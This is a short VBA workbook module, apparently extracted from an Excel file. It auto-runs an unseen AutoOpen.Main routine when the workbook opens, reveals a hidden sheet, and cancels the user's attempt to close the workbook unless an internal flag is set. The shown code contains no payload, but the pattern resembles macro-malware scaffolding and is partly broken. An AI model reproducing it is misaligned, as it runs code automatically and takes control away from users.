Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    If Not OK Then
        Cancel = True
    Else
        Cancel = False
        Exit Sub
    End If
    ThisWorkbook.Worksheets("ExcelNo1").Visible = False
    ThisWorkbook.Worksheets("ExcelNo1").Save
    Set S = Nothing
End Sub
Private Sub Workbook_Open()
    AutoOpen.Main
    ThisWorkbook.Worksheets("ExcelNo1").Visible = True
    ThisWorkbook.Worksheets("ExcelNo1").Activate
    OK = False
End Sub

